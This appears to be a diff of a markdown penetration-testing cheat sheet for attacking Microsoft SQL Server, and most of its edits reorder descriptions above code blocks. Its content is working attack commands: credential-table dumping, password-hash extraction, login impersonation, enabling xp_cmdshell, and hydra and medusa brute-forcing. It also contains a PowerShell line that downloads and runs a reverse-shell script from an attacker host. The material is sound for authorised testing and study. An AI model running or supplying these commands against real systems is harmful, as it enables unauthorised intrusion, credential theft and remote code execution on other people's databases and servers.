@@ -7,81 +7,95 @@ Microsoft SQL Server (MSSQL) is a common target in penetration testing due to mi
 ## 1. Connecting to MSSQL
 
 - **Using** `sqsh` **(Linux)**
+Connects to an MSSQL server using a specified username and password.
 
 ```
 sqsh -S target-ip -U user -P password
 ```
 
-Connects to an MSSQL server using a specified username and password.
 
 - **Using** `impacket-mssqlclient`
+Connects to MSSQL using Impacket’s `mssqlclient.py`.
 
 ```
 python3 mssqlclient.py DOMAIN/user:password@target-ip
 ```
 
-Connects to MSSQL using Impacket’s `mssqlclient.py`.
 
 - **Using PowerShell (Windows)**
-
+Connects to MSSQL using Impacket’s `sqlcmd`.
 ```
 sqlcmd -S target-ip -U user -P password
 ```
 
-Connects using `sqlcmd`.
+If you have access to the machine where the DB is allocated, you can interact with it without creating an interactive shell.
+
+```powershell
+sqlcmd -S .\SQLEXPRESS -E -Q "SELECT * FROM CredentialsDB.dbo.Credentials"
+```
+
 
 ---
 
 ## 2. Enumerating MSSQL
 
 - **Checking MSSQL Version**
+Retrieves MSSQL version information.
 
 ```
 SELECT @@VERSION;
 ```
 
-Retrieves MSSQL version information.
 
 - **Listing Databases**
+Displays all available databases.
 
 ```
 SELECT name FROM master.dbo.sysdatabases;
 ```
 
-Displays all available databases.
 
 - **Listing Tables**
+Lists tables in a specific database.
 
 ```
 SELECT name FROM <database_name>.sys.tables;
 ```
 
-Lists tables in a specific database.
+- **Querying Data**
+Retrieves all the information from a Table.
+
+```
+SELECT *name* FROM <database_name>.dbo.<table_name>;
+```
 
 - **Listing Users**
-
+Retrieves all users.
 ```
 SELECT name FROM master.sys.syslogins;
 ```
 
-Retrieves all users.
 
 - **Checking Privileges**
+Checks if the current user has `sysadmin` privileges.
 
 ```
 SELECT is_srvrolemember('sysadmin');
 ```
 
-Checks if the current user has `sysadmin` privileges.
 
-- **Enumerate local users**
-```bash
-nxc mssql <target> -u <user> -p <password> --rid-brute 10000 --local-auth
-```
 
 ---
 
 ## 3. Credential Hunting & Privilege Escalation
+
+- **Enumerate local users**
+
+Retrives the machine local users using mssql.
+
+```bash
+nxc mssql <target> -u <user> -p <password> --rid-brute 10000 --local-auth
+```
 
 - **User Impersonation**
 
@@ -99,71 +113,72 @@ EXECUTE AS LOGIN = '<target_user>';
 
 - **Finding Stored Credentials**
 
+Retrieves stored password hashes (if accessible).
+
 ```
 SELECT name, password_hash FROM sys.sql_logins;
 ```
 
-Retrieves stored password hashes (if accessible).
 
 - **Enabling** `xp_cmdshell` **for Command Execution**
+
+Enables `xp_cmdshell` to execute system commands.
 
 ```
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 ```
 
-Enables `xp_cmdshell` to execute system commands.
 
 - **Executing System Commands with** `xp_cmdshell`
+
+Runs system commands with MSSQL privileges.
 
 ```
 EXEC xp_cmdshell 'whoami';
 ```
 
-Runs system commands with MSSQL privileges.
 
 ---
 
 ## 4. Exploiting MSSQL for Lateral Movement
 
 - **Using MSSQL for Reverse Shell**
+Executes a PowerShell-based reverse shell.
 
 ```
 EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/rev.ps1')"';
 ```
 
-Executes a PowerShell-based reverse shell.
-
 - **Abusing MSSQL Linked Servers**
+Lists linked servers (potential pivoting points).
 
 ```
 EXEC sp_linkedservers;
 ```
 
-Lists linked servers (potential pivoting points).
 
 - **Executing Commands on Linked Servers**
+Runs commands on a linked MSSQL server.
 
 ```
 EXEC ('whoami') AT linked_server_name;
 ```
 
-Runs commands on a linked MSSQL server.
 
 ---
 
 ## 5. Brute-Forcing MSSQL Credentials
 
 - **Using** `hydra`
+Attempts brute-force login.
 
 ```
 hydra -L users.txt -P passwords.txt mssql://target-ip
 ```
 
-Attempts brute-force login.
+Alternative brute-force attack.
 
 ```
 medusa -h target-ip -U users.txt -P passwords.txt -M mssql
 ```
-
-Alternative brute-force attack.
